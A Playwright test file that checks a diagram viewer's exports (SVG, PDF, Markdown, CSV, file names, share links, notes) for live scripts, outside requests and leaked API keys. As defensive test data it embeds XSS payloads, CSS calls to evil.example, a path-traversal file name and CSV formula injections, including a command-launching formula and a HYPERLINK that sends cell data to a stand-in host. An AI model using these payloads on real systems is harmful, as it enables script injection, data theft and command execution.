import { readFileSync } from 'node:fs';

import { expect, test, type BrowserContext, type Page } from '@playwright/test';

import {
  arm,
  expectNothingRan,
  openDrawn,
  readReport,
  seedStorage,
  shareLink,
  type Armed,
} from './support/armed.ts';
import { hostile, HOSTILE_FLOW } from './support/attacks.ts';
import { ALL_SENTINELS, mockModel, PROVIDER_URLS, storedAi } from './support/models.ts';

// An export leaves the page and its policy behind, so nothing hostile may stay live in the file.
// Each file is checked as text, then opened on a page of its own with no policy to help.

async function openExport(page: Page, item: string | RegExp) {
  await page.getByRole('button', { name: /^Export/ }).click();
  await page.getByRole('menuitem', { name: item }).click();
}

async function saved(page: Page, click: () => Promise<void>) {
  const [download] = await Promise.all([page.waitForEvent('download'), click()]);
  return { name: download.suggestedFilename(), bytes: readFileSync(await download.path()) };
}

const exported = (page: Page, item: string | RegExp) => saved(page, () => openExport(page, item));

async function exportedPdf(page: Page, withNotes: boolean) {
  await openExport(page, 'PDF…');
  const dialog = page.getByRole('dialog', { name: 'Download PDF' });
  await expect(dialog).toBeVisible();
  if (withNotes) await dialog.getByRole('checkbox', { name: 'Include my notes' }).check();
  return saved(page, () => dialog.getByRole('button', { name: /^Download / }).click());
}

/** The text the page last put on the clipboard. */
const copied = async (page: Page, click: () => Promise<void>) => {
  await click();
  await expect.poll(async () => (await readReport(page)).clipboard.length).toBeGreaterThan(0);
  const { clipboard } = await readReport(page);
  await page.evaluate('window.__sec().clipboard.length = 0');
  return clipboard.at(-1) ?? '';
};

/** Opens the content as a document of its own at the viewer's address, with no policy on it. */
async function openAsDocument(
  context: BrowserContext,
  baseURL: string | undefined,
  body: string | Buffer,
  contentType: string,
): Promise<Armed> {
  const page = await context.newPage();
  const armed = await arm(page, baseURL);
  const address = new URL('/__exported', baseURL).href;
  await page.route(address, (route) => route.fulfill({ status: 200, contentType, body }));
  await page.goto(address);
  return armed;
}

/** What a Markdown reader treats as markup: everything except code spans, which it never runs. */
const outsideCodeSpans = (markdown: string): string => markdown.replace(/`[^`\n]*`/g, '');

/** Opens Markdown as a page, which is the worst a reader that allows raw markup could do. */
async function expectMarkdownInert(
  context: BrowserContext,
  baseURL: string | undefined,
  markdown: string,
  what: string,
) {
  expect(markdown).toContain('onerror=');
  const rest = outsideCodeSpans(markdown);
  expect(rest, `${what}: a link with a script address`).not.toMatch(/\]\s*\(\s*javascript:/i);
  expect(rest, `${what}: an image`).not.toMatch(/!\[[^\]]*\]\(/);
  expect(rest, `${what}: a tag`).not.toMatch(/<(?!br>)[a-z!/?]/i);
  const armed = await openAsDocument(context, baseURL, rest, 'text/html');
  await expectNothingRan(armed, what);
  await armed.page.close();
}

test.describe('the exports of a hostile flow', () => {
  async function openHostile(page: Page, baseURL: string | undefined, code = HOSTILE_FLOW) {
    const armed = await arm(page, baseURL);
    await openDrawn(page, shareLink.z(code));
    await page.getByTestId('diagram').focus();
    return armed;
  }

  test('SVG stays inert as a file, as an image and as a page', async ({
    page,
    context,
    baseURL,
  }) => {
    const armed = await openHostile(page, baseURL);
    const { name, bytes } = await exported(page, 'SVG');
    expect(name).toMatch(/\.svg$/);
    const text = bytes.toString('utf8');
    expect(text).toContain('<svg');
    expect(text).not.toMatch(/<script|<foreignObject|<iframe|<object|<embed/i);
    expect(text).not.toMatch(/\son[a-z]+\s*=\s*["']/i);
    expect(text).not.toMatch(/(?:href|src)\s*=\s*["']\s*(?:javascript|data):/i);
    await expectNothingRan(armed, 'making the SVG');

    for (const type of ['image/svg+xml', 'text/html']) {
      const opened = await openAsDocument(context, baseURL, bytes, type);
      await expectNothingRan(opened, `the SVG opened as ${type}`);
      await opened.page.close();
    }
  });

  test('an SVG with theme CSS asks no other site for anything', async ({
    page,
    context,
    baseURL,
  }) => {
    const code = `%%{init: {"themeCSS": "@import url(https://evil.example/a.css); .actor { fill: url(https://evil.example/b.svg); background: image-set('https://evil.example/c.png' 1x) } @font-face { font-family: x; src: url(https://evil.example/d.woff2) } .label { background: u\\\\72 l(https://evil.example/e.png) }"}}%%
sequenceDiagram
  A->>B: styled`;
    await openHostile(page, baseURL, code);
    const { bytes } = await exported(page, 'SVG');
    expect(bytes.toString('utf8')).not.toContain('evil.example');
    const opened = await openAsDocument(context, baseURL, bytes, 'image/svg+xml');
    await expectNothingRan(opened, 'the themed SVG');
  });

  test('PNG and the step image are only pictures', async ({ page, baseURL }) => {
    const armed = await openHostile(page, baseURL);
    const png = await exported(page, '1×');
    expect(png.bytes.subarray(0, 8).toString('latin1')).toBe('\x89PNG\r\n\x1a\n');
    await page.keyboard.press('ArrowRight');
    const step = await exported(page, 'Step image');
    expect(step.bytes.subarray(0, 8).toString('latin1')).toBe('\x89PNG\r\n\x1a\n');
    await expectNothingRan(armed, 'the pictures');
  });

  test('PDF has no script, no action and no link', async ({ page, baseURL }) => {
    const armed = await openHostile(page, baseURL);
    const { name, bytes } = await exportedPdf(page, true);
    expect(name).toMatch(/\.pdf$/);
    const text = bytes.toString('latin1');
    expect(text.startsWith('%PDF-')).toBe(true);
    for (const word of [
      '/JavaScript',
      '/JS',
      '/OpenAction',
      '/AA',
      '/Launch',
      '/URI',
      '/SubmitForm',
      '/EmbeddedFile',
      '/RichMedia',
    ]) {
      expect(text, word).not.toMatch(new RegExp(`${word}[^A-Za-z]`));
    }
    expect(text).not.toContain('__pwned');
    await expectNothingRan(armed, 'the PDF');
  });

  test('Code is the exact text, as plain text', async ({ page, baseURL }) => {
    const armed = await openHostile(page, baseURL);
    const { name, bytes } = await exported(page, 'Code');
    expect(name).toMatch(/\.mmd$/);
    expect(bytes.toString('utf8')).toBe(HOSTILE_FLOW);
    await expectNothingRan(armed, 'the code file');
  });

  test('Markdown from the Export menu and from the table has no live markup', async ({
    page,
    context,
    baseURL,
  }) => {
    const armed = await openHostile(page, baseURL);
    const fromMenu = await copied(page, () => openExport(page, 'Copy table as Markdown'));
    await expectMarkdownInert(context, baseURL, fromMenu, 'Markdown from the menu');

    await page.keyboard.press('t');
    const table = page.locator('#tableView');
    const fromTable = await copied(page, () =>
      table.getByRole('button', { name: 'Copy as Markdown' }).click(),
    );
    await expectMarkdownInert(context, baseURL, fromTable, 'Markdown from the table');
    await expectNothingRan(armed, 'copying Markdown');
  });

  test('Markdown keeps a label with backticks and pipes inside its code span', async ({
    page,
    context,
    baseURL,
  }) => {
    const code = `sequenceDiagram
  %% @title Ticks
  %% @step | a | cell | <img src=x onerror="__pwned('md-cell')">
  A->>B: x\` <img src=x onerror="__pwned('md-tick')"> \`y | z
  %% @step [a link](javascript:__pwned('md-link')) ![an image](https://evil.example/md.png)
  %% @ref [ref](javascript:__pwned('md-ref'))
  B-->>A: 200 ok`;
    await openHostile(page, baseURL, code);
    const markdown = await copied(page, () => openExport(page, 'Copy table as Markdown'));
    await expectMarkdownInert(context, baseURL, markdown, 'Markdown with backticks');
  });

  const FORMULAS = {
    title: `=HYPERLINK("https://evil.example/?"&A1,"Click")`,
    cells: ['=1+1', `=cmd|' /C calc'!A0`, '+2+2', '-3+3', '@SUM(4+4)'],
  };
  const FORMULA_FLOW = `sequenceDiagram
  %% @title ${FORMULAS.title}
  participant A as =HYPERLINK("https://evil.example/from")
  participant B as +To
  %% @section @Chapter
  %% @step =1+1
  %% @payload =cmd|' /C calc'!A0
  %% @effect +2+2
  %% @unconfirmed -3+3
  %% @ref @SUM(4+4)
  %% @uses hook =name a side part
  A->>B: =5+5
  %% @step -6+6
  B-->>A: 200 ok`;

  /** Reads CSV with quotes, line ends inside quotes and doubled quotes. */
  function parseCsv(text: string): string[][] {
    const rows: string[][] = [[]];
    let cell = '';
    let quoted = false;
    for (let i = 0; i < text.length; i++) {
      const c = text.charAt(i);
      if (quoted) {
        if (c === '"' && text.charAt(i + 1) === '"') {
          cell += '"';
          i++;
        } else if (c === '"') quoted = false;
        else cell += c;
      } else if (c === '"') quoted = true;
      else if (c === ',') {
        rows.at(-1)?.push(cell);
        cell = '';
      } else if (c === '\n') {
        rows.at(-1)?.push(cell.replace(/\r$/, ''));
        rows.push([]);
        cell = '';
      } else cell += c;
    }
    return rows.filter((row) => row.length > 1);
  }

  const expectNoFormula = (csv: string) => {
    const cells = parseCsv(csv.replace(/^\uFEFF/, '')).flat();
    expect(cells.length).toBeGreaterThan(14);
    expect(cells).toContain("'=5+5");
    expect(cells.filter((cell) => /^[=+\-@\t\r]/.test(cell))).toEqual([]);
  };

  test('CSV cells cannot start a spreadsheet formula', async ({ page, baseURL }) => {
    const armed = await openHostile(page, baseURL, FORMULA_FLOW);
    const fromMenu = await exported(page, 'Step table');
    expectNoFormula(fromMenu.bytes.toString('utf8'));

    await page.keyboard.press('t');
    const table = page.locator('#tableView');
    await table.getByRole('checkbox', { name: /notes/i }).check();
    await page.getByTestId('diagram').focus();
    await page.keyboard.press('ArrowRight');
    await page.keyboard.press('n');
    await page.getByTestId('note-ta').fill('=7+7');
    await page.keyboard.press('Escape');
    const fromTable = await saved(page, () =>
      table.getByRole('button', { name: 'Download CSV' }).click(),
    );
    const text = fromTable.bytes.toString('utf8');
    expectNoFormula(text);
    expect(text).toContain("'=7+7");
    await expectNothingRan(armed, 'the CSV');
  });

  test('a hostile title leaves no path or markup in a file name', async ({ page, baseURL }) => {
    const code = `sequenceDiagram
  %% @title ../../evil<script>__pwned('name')</script>:*?"|\\
  A->>B: x`;
    const armed = await openHostile(page, baseURL, code);
    for (const item of ['SVG', 'Code', 'Step table']) {
      const { name } = await exported(page, item);
      expect(name).not.toMatch(/[\\/:*?"<>|]/);
    }
    await expect(page.getByRole('status').filter({ hasText: 'Downloaded' }).first()).toContainText(
      'evil',
    );
    await expectNothingRan(armed, 'file names');
  });

  test('share links stay on their own site and bring back only the same text', async ({
    page,
    baseURL,
  }) => {
    const armed = await openHostile(page, baseURL);
    const viewer = await copied(page, () => openExport(page, 'Copy viewer link'));
    expect(new URL(viewer).origin).toBe(new URL(baseURL ?? '').origin);
    await page.keyboard.press('ArrowRight');
    const step = await copied(page, () => openExport(page, 'Copy link to this step'));
    expect(new URL(step).origin).toBe(new URL(baseURL ?? '').origin);
    const live = await copied(page, () => openExport(page, 'Copy mermaid.live link'));
    expect(new URL(live).origin).toBe('https://mermaid.live');
    await expectNothingRan(armed, 'copying links');

    await page.goto('about:blank');
    await openDrawn(page, viewer.replace(new URL(baseURL ?? '').origin, ''));
    await page.keyboard.press('c');
    await expect(page.getByRole('textbox', { name: 'Diagram code' })).toHaveValue(HOSTILE_FLOW);
    await expectNothingRan(armed, 'reopening the link');
  });
});

test.describe('a notes file with hostile notes', () => {
  test('stays data', async ({ page, baseURL, context }) => {
    const armed = await arm(page, baseURL);
    await openDrawn(page, shareLink.z('sequenceDiagram\n  %% @title Noted\n  A->>B: hello'));
    await page.getByTestId('diagram').focus();
    await page.keyboard.press('ArrowRight');
    await page.keyboard.press('n');
    await page.getByTestId('note-ta').fill(hostile('note-export'));
    await page.keyboard.press('Escape');
    await page.getByTestId('bm-btn').click();
    const { name, bytes } = await saved(page, () =>
      page.getByRole('button', { name: 'Export notes' }).click(),
    );
    expect(name).toBe('Noted notes.json');
    const file = JSON.parse(bytes.toString('utf8')) as { notes: Record<string, { note: string }> };
    expect(Object.values(file.notes).map((n) => n.note)).toEqual([hostile('note-export')]);
    const opened = await openAsDocument(context, baseURL, bytes, 'application/json');
    await expectNothingRan(opened, 'the notes file');
    await expectNothingRan(armed, 'exporting notes');
  });
});

test.describe('keys in exports', () => {
  test('no file, link or copied text holds a key', async ({ page, baseURL }) => {
    const armed = await arm(page, baseURL);
    await seedStorage(page, { 'swv:ai': storedAi('groq') });
    await mockModel(armed, PROVIDER_URLS.groq, 'An answer.');
    await openDrawn(page, shareLink.z('sequenceDiagram\n  %% @title Keyed\n  A->>B: hello'));
    await page.getByTestId('diagram').focus();
    await page.keyboard.press('ArrowRight');
    await page.keyboard.press('a');
    const dialog = page.getByRole('dialog', { name: 'Ask AI about step 1' });
    await dialog.getByRole('button', { name: 'Why this step?' }).click();
    await expect(dialog.getByTestId('ask-answer')).toContainText("Saved to this step's note");
    await page.keyboard.press('Escape');
    await expect(dialog).toBeHidden();

    const made: Record<string, string> = {};
    for (const item of ['SVG', '1×', 'Step image', 'Code', 'Step table']) {
      made[item] = (await exported(page, item)).bytes.toString('latin1');
    }
    made.PDF = (await exportedPdf(page, true)).bytes.toString('latin1');
    for (const item of ['Copy table as Markdown', 'Copy viewer link', 'Copy link to this step']) {
      made[item] = await copied(page, () => openExport(page, item));
    }
    const live = await copied(page, () => openExport(page, 'Copy mermaid.live link'));
    made.live = live;
    await page.getByTestId('bm-btn').click();
    made.notes = (
      await saved(page, () => page.getByRole('button', { name: 'Export notes' }).click())
    ).bytes.toString('latin1');
    await page.keyboard.press('Escape');

    expect(Object.keys(made)).toHaveLength(11);
    for (const [what, content] of Object.entries(made)) {
      expect(content.length, what).toBeGreaterThan(0);
      for (const key of ALL_SENTINELS) expect(content, what).not.toContain(key);
    }
    // The link holds the code, and the code holds no key: read what the link brings back.
    await page.goto('about:blank');
    await openDrawn(
      page,
      (made['Copy viewer link'] ?? '').replace(new URL(baseURL ?? '').origin, ''),
    );
    const code = await page.evaluate<string>(`localStorage.getItem('swv:code') ?? ''`);
    for (const key of ALL_SENTINELS) expect(code).not.toContain(key);
    await expectNothingRan(armed, 'keys in exports');
  });
});
